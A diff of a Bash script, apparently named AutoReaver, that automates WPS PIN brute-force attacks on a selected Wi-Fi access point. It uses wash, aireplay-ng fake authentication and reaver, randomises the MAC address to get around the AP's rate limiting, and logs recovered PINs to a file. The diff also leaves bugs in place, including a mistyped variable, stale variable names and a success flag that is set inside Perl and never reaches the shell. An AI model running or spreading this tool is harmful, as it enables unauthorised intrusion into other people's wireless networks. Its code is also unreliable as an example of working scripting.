@@ -22,11 +22,15 @@
 ###### Terminator
 ###### Wash
 ###################################################################################################################################################
+###### DBus Server launch EROR issue, please visit https://www.kali.org/docs/general-use/xfce-with-rdp/
+###################################################################################################################################################
 
 if [ "$EUID" -ne 0 ]; then
 	echo "Please rua as root!!!";
 	exit;
 fi
+
+source $(pwd)"/configurationSettings";
 
 ###########################################################################################################################
 ###################################################### FUNCTIONS ##########################################################
@@ -50,10 +54,15 @@ setDeviceSettings(){
                 echoRed "No WIFI Devices Detected!!!";
                 echoWhite "---------------------------";
                 echo "";
-		exit;
+		exitAutoReaver;
 	fi
 
-	COUNT_DEV=1;
+	local COUNT_DEV=1;
+	local STR;
+	local DRIVER;
+	local LOGICAL;
+	local PHY;
+	local WIFICHOICE;
 
 	unset option ARR_DEVICES  ERROR;
 	declare -a ARR_DEVICES;
@@ -75,9 +84,9 @@ setDeviceSettings(){
 	echo"";
 
 	while true; do
-	        read -p "Choose WIFI Device: " wifiChoice;
+	        read -p "Choose WIFI Device: " WIFICHOICE;
 
-		if [[ $wifiChoice -le ${#ARR_DEVICES[@]}/3 && $wifiChoice -gt 0 ]]; then
+		if [[ $WIFICHOICE -le ${#ARR_DEVICES[@]}/3 && $WIFICHOICE -gt 0 ]]; then
 			WIFI_CARD_DRIVER="${ARR_DEVICES[(wifiChoice*3)-1]}";
 			WIFI_CARD_LOGICAL="${ARR_DEVICES[(wifiChoice*3)-2]}";
 			WIFI_CARD_PHY="${ARR_DEVICES[(wifiChoice*3)-3]}";
@@ -88,7 +97,7 @@ setDeviceSettings(){
 	done
 
 	echo "";
-	echoBlue "Checking if Selected Device is in Monitor Mode......";
+		echoBlue "Checking if Selected Device is in Monitor Mode......";
 	echo "";
 
 	getMonitorName;
@@ -98,7 +107,7 @@ setDeviceSettings(){
 		stopMonitor;
 	fi
 
-	SCRIPT_INIT=0 && sleep 2;
+	sleep 2;
 
 	unset ARR_DEVICES;
 }
@@ -108,14 +117,18 @@ setAPSettings(){
 	echoBlue "Please Wait...";
 	echo "";
 
-	CMD_WASH="timeout --preserve-status $WASH_TIME wash -i $WIFI_CARD_MONITOR > $REAVER_TMP_DIR'/wash.list'";
+	local LINE;
+	local i;
+	local APCHOICE;
+
+	local CMD_WASH="timeout --preserve-status $WASH_TIME wash -i $WIFI_CARD_MONITOR > $REAVER_TMP_DIR'/wash.list'";
 	eval $CMD_WASH >>/dev/null;
 
 	unset option AP_LIST ERROR;
 	declare -a AP_LIST;
 
-	while IFS= read -r line; do
-		AP_LIST[${#AP_LIST[@]}]="$line";
+	while IFS= read -r LINE; do
+		AP_LIST[${#AP_LIST[@]}]="$LINE";
 	done < "$REAVER_TMP_DIR/wash.list"
 
 	if [ ${#AP_LIST[@]} -eq 2 ]; then
@@ -123,7 +136,7 @@ setAPSettings(){
 		echoBlue "Try Increase WASH Scan Time in configurationSettings File...";
 		echoBlue "Exiting..."
 		sleep 4;
-		exit;
+		exitAutoReaver;
 	fi
 
 	for (( i=0; i<${#AP_LIST[@]}; i++ )); do
@@ -140,19 +153,19 @@ setAPSettings(){
 	echo "";
 
 	while true; do
-		read -p "Choose AP (1-$((${#AP_LIST[@]}-2))) 0 to All): " apChoice;
+		read -p "Choose AP (1-$((${#AP_LIST[@]}-2))) 0 to All): " APCHOICE;
 
-		if [[ $apChoice -le $((${#AP_LIST[@]}-2)) && $apChoice -ge 1 ]]; then
-			apChoice=$((apChoice+1))
-			AP_BSSID=$(awk '{ print $1 }' <<< "${AP_LIST[$apChoice]}");
-			AP_CHANNEL=$(awk '{ print $2 }' <<< "${AP_LIST[$apChoice]}");
-			AP_ESSID=$(awk '{ print $7 }' <<< "${AP_LIST[$apChoice]}");
-			AP_WPS=$(awk '{ print $4 }' <<< "${AP_LIST[$apChoice]}");
-			AP_LOCK=$(awk '{ print $5 }' <<< "${AP_LIST[$apChoice]}");
+		if [[ $APCHOICEe -le $((${#AP_LIST[@]}-2)) && $APCHOICE -ge 1 ]]; then
+			APCHOICE=$((APCHOICE+1))
+			AP_BSSID=$(awk '{ print $1 }' <<< "${AP_LIST[$APCHOICE]}");
+			AP_CHANNEL=$(awk '{ print $2 }' <<< "${AP_LIST[$APCHOICE]}");
+			AP_ESSID=$(awk '{ print $7 }' <<< "${AP_LIST[$APCHOICE]}");
+			AP_WPS=$(awk '{ print $4 }' <<< "${AP_LIST[$APCHOICE]}");
+			AP_LOCK=$(awk '{ print $5 }' <<< "${AP_LIST[$APCHOICE]}");
 			unset AP_LIST;
 			break;
 		else
-			if [ $apChoice -eq 0 ]; then
+			if [ $APCHOICE -eq 0 ]; then
 				###### All option will allow this script to loop the wash output result
 				###### Under development......
 				echoRed "All... is Currently Unavailable. Please Select Single Target."
@@ -162,17 +175,21 @@ setAPSettings(){
 }
 
 setReaverOpt(){
-	while true; do
-        	read -p "Use $FAKE_AUTH_DELAY_SECONDS Sec AIREPLAY-NG Fake Authentication Delay (Y/N)? " yn;
+	local YN;
+	local SEC
+	local ATTEMPT;
 
-		case $yn in
+	while true; do
+        	read -p "Use $FAKE_AUTH_DELAY_SECONDS Sec AIREPLAY-NG Fake Authentication Delay (Y/N)? " YN;
+
+		case $YN in
 			[Yy]* )
 				break;;
 			[Nn]* )
-				read -p "Please Enter New Fake Authentication Value: " nSec;
+				read -p "Please Enter New Fake Authentication Value: " SEC;
 
-				if [[ $nSec -lt 6001 && $nSec -gt 0 ]]; then
-		                        FAKE_AUTH_DELAY_SECONDS=$nSec;
+				if [[ $SEC -lt 6001 && $SEC -gt 0 ]]; then
+		                        FAKE_AUTH_DELAY_SECONDS=$SEC;
 					break;
 	       	       		else
 	        	                echoRed "Invalid Value...";
@@ -182,16 +199,16 @@ setReaverOpt(){
 	done
 
         while true; do
-                read -p "Use $REAVER_PIN_ATTEMPTS PIN Attempts Before Changin MAC (Y/N)? " yn;
+                read -p "Use $REAVER_PIN_ATTEMPTS PIN Attempts Before Changin MAC (Y/N)? " YN;
 
-                case $yn in
+                case $YN in
                         [Yy]* )
                                 break;;
                         [Nn]* )
-                                read -p "Please Enter PIN Attempts: " nAtt;
+                                read -p "Please Enter PIN Attempts: " ATTEMPT;
 
-                                if [ $nAtt -gt 0 ]; then
-                                        REAVER_PIN_ATTEMPTS=$nAtt;
+                                if [ $ATTEMPT -gt 0 ]; then
+                                        REAVER_PIN_ATTEMPTS=$ATTEMPT;
                                         break;
                                 else
                                         echoRed "Invalid Value...";
@@ -201,16 +218,16 @@ setReaverOpt(){
         done
 
         while true; do
-                read -p "Use $REAVER_ATTEMPT_DELAY Sec Delay Between Reaver PIN Attempt (Y/N)? " yn;
+                read -p "Use $REAVER_ATTEMPT_DELAY Sec Delay Between Reaver PIN Attempt (Y/N)? " YN;
 
-                case $yn in
+                case $YN in
                         [Yy]* )
                                 break;;
                         [Nn]* )
-                                read -p "Please Enter New Attempt Delay Value: " nSec;
+                                read -p "Please Enter New Attempt Delay Value: " SEC;
 
-                                if [ $nSec -gt 0 ]; then
-                                        REAVER_ATTEMPT_DELAY=$nSec;
+                                if [ $SEC -gt 0 ]; then
+                                        REAVER_ATTEMPT_DELAY=$SEC;
                                         break;
                                 else
                                         echoRed "Invalid Value...";
@@ -228,9 +245,9 @@ setReaverOpt(){
 		echoWhite "-t 15: Set the receive timeout period";
 		echoWhite "--win7: Mimic a Windows 7 registrar";
 
-                read -p "(Y/N)? " yn;
+                read -p "(Y/N)? " YN;
 
-                case $yn in
+                case $YN in
                         [Yy]* )
 				ADDITIONAL_OPTIONS_YN="Yes"
                                 break;;
@@ -246,7 +263,8 @@ getRandomMac(){
 	sleep 1;
 
 	ifconfig $WIFI_CARD_LOGICAL down;
-	echoBlue "Changing $WIFI_CARD_LOGICAL MAC......" && macchanger -r $1 $WIFI_CARD_LOGICAL;
+	echoBlue "Changing $WIFI_CARD_LOGICAL MAC......";
+	WIFI_CARD_RNDMAC=$(macchanger -r $1 $WIFI_CARD_LOGICAL | awk '{ print $3 }' <<< "$(grep -Ei 'new.*mac:')")
 	ifconfig $WIFI_CARD_LOGICAL up;
 }
 
@@ -260,12 +278,18 @@ resetDeviceDriver(){
 }
 
 getMonitorName(){
+	local FIND_MONITOR;
+
 	FIND_MONITOR=$(iwconfig | grep -Ei "$WIFI_CARD_LOGICAL.*monitor")
 	WIFI_CARD_MONITOR=$(awk '{ print $1 }' <<< "$FIND_MONITOR");
 }
 
 startMonitor(){
 	echoBlue "Killing Processes Associated to AIRMON-NG......";
+
+	local CMD_KILL;
+	local MESSAGE;
+	local CMD_START;
 
 	if [[ $(airmon-ng check | grep -ic "pid") != 0 ]]; then
 		CMD_KILL="airmon-ng check kill";
@@ -277,21 +301,23 @@ startMonitor(){
 
 	sleep 2;
 
-	varMESSAGE="Starting Monitor Mode on $WIFI_CARD_LOGICAL";
+	MESSAGE="Starting Monitor Mode on $WIFI_CARD_LOGICAL";
 
 	if [ -z "$AP_CHANNEL" ]; then
-		varMESSAGE+="......";
+		MESSAGE+="......";
 	else
-		varMESSAGE+=" on Channel $AP_CHANNEL......";
+		MESSAGE+=" on Channel $AP_CHANNEL......";
 	fi
 
-	echoBlue "$varMESSAGE";
+	echoBlue "$MESSAGE";
 
 	CMD_START="airmon-ng start $WIFI_CARD_LOGICAL $AP_CHANNEL";
 	eval $CMD_START >>/dev/null && getMonitorName && checkIEEEPaths;
 }
 
 stopMonitor(){
+	local CMD_STOP;
+
 	if [ -z "$WIFI_CARD_MONITOR" ]; then
 		getMonitorName;
 	fi
@@ -303,24 +329,45 @@ stopMonitor(){
 }
 
 checkIEEEPaths(){
-	FOUND=0;
+	local FOUND=0;
+	local LOGICAL;
+	local PHYSICAL;
 
-	STR_VAR=$(echo "$WIFI_CARD_LOGICAL" | cut -c 1-5);
+	LOGICAL=$(echo "$WIFI_CARD_LOGICAL" | cut -c 1-5);
 
 	for PHY in $(ls $PATH_IEEE); do
-		STR_PHY=$(ls "$PATH_IEEE$PHY$PATH_DEVICE" | cut -c 1-5);
+		PHYSICAL=$(ls "$PATH_IEEE$PHY$PATH_DEVICE" | cut -c 1-5);
 
-		if [ "$STR_PHY" == "$STR_VAR" ]; then
+		if [ "$PHYSICAL" == "$LOGICAL" ]; then
 			WIFI_CARD_PHY=$PHY;
-			WIFI_CARD_LOGICAL=$STR_PHY;
+			WIFI_CARD_LOGICAL=$PHYSICAL;
 			FOUND=1;
 		fi
 	done
 
 	if [ $FOUND == 0 ]; then
 		echoRed "Something Went Wrong With WIFI Device......";
-		echoWhite "Check Your WIFI Device(S)." && exit;
+		echoWhite "Check Your WIFI Device(S).";
+		exitAutoReaver;
 	fi
+}
+
+exitAutoReaver(){
+        if [ ! -z "$WIFI_CARD_MONITOR" ]; then
+                stopMonitor;
+        fi
+
+	if [ ! -z "$WIFI_CARD_DRIVER" ]; then
+		resetDeviceDriver;
+	fi
+
+	netManagerStatus=$(systemctl status NetworkManager | awk '{ print $2 }' <<< "$(grep -Ei 'Active:')");
+
+	if [ "$netManagerStatus" = "inactive" ]; then
+		systemctl restart NetworkManager;
+	fi
+
+	exit;
 }
 
 ###########################################################################################################################
@@ -329,14 +376,13 @@ checkIEEEPaths(){
 
 clear;
 
-source $(pwd)"/configurationSettings";
 SCRIPT_INIT=1;
 
 if [[ ! -f $REAVER_DIR"/configurationSettings" ]]; then
         echoRed "Configuration file: ./configurationSettings not present!!!";
         echoBlue "Try to recover this file, or download default version from project site, and try again";
 	echo "";
-        exit;
+        exitAutoReaver;
 fi
 
 if [[ ! -d "$REAVER_TMP_DIR" ]]; then
@@ -411,19 +457,38 @@ done
 clear;
 
 SESSION_FILE=$REAVER_SESSION_DIR'/'$AP_ESSID'_SESSION.wpc';
+BSSID_LIMIT_FILE=$REAVER_TMP_DIR'/'$AP_ESSID'_LIMIT';
+CRACKED_FILE=$REAVER_CRACKED_DIR'/'$AP_ESSID'_PIN';
+
 stopMonitor && resetDeviceDriver && startMonitor;
 
 while true; do
-#	CMD_FAUTH="aireplay-ng -1 $FAKE_AUTH_DELAY_SECONDS -a $AP_BSSID -c $AP_BSSID $WIFI_CARD_MONITOR";
-#	CMD_REAVER="reaver -i $WIFI_CARD_MONITOR -b $AP_BSSID --channel=$AP_CHANNEL --mac=$WIFI_CARD_CURR_MAC --session=$SESSION_FILE -g $REAVER_PIN_ATTEMPTS -d $REAVER_ATTEMPT_DELAY -vv $ADDITIONAL_OPTIONS > $REAVER_TMP_DIR'/REAVER_OUTPUT'";
-#	CMD_REAVER & sleep 4 & CMD_FAUTH >>/dev/null;
+	CMD_FAUTH="konsole --background-mode -e /bin/sh -c 'aireplay-ng -1 $FAKE_AUTH_DELAY_SECONDS -a $AP_BSSID -c $AP_BSSID ${WIFI_CARD_MONITOR}'";
+	eval $CMD_FAUTH 2>/dev/null
 
-#	REAVER_GET_KEY=$(grep -c 'WPS PIN' $REAVER_TMP_DIR'/REAVER_OUTPUT');
+	CMD_REAVER="reaver -i ${WIFI_CARD_MONITOR} -b $AP_BSSID --channel=$AP_CHANNEL --mac=$WIFI_CARD_RNDMAC --session=$SESSION_FILE -g $REAVER_PIN_ATTEMPTS -d $REAVER_ATTEMPT_DELAY -vv $ADDITIONAL_OPTIONS > $REAVER_TMP_DIR'/REAVER_OUTPUT'";
+	echoWhite "$CMD_REAVER" && eval $CMD_REAVER \
+	| perl -lane '
+		if(/AP rate limiting/){
+			system("touch '$BSSID_LIMIT_FILE'");
+			# sending -INT signal acts like CTRL + C shortcut
+			system("killall -INT reaver");
+			print $_,"\n[+] Session saved";
+			exit 1;
+		}
+		if (/WPS PIN/){
+			open FILE, ">>'$CRACKED_FILE'";
+			print FILE "-----PIN----'$AP_BSSID' ('$AP_ESSID')-----------";
+			print FILE $_;
+			close FILE;
+			REAVER_GET_KEY=1;
+		}
+		print $_;
+	';
 
 	if [[ $REAVER_GET_KEY == 1 ]]; then
 		echoWhite "PIN Found......";
 		sleep 4;
-		clear;
 		break;
 	else
 		echoWhite "Failed to recover WPA key......";
@@ -436,3 +501,5 @@ while true; do
 	getRandomMac;
         startMonitor;
 done
+
+exitAutoReaver;
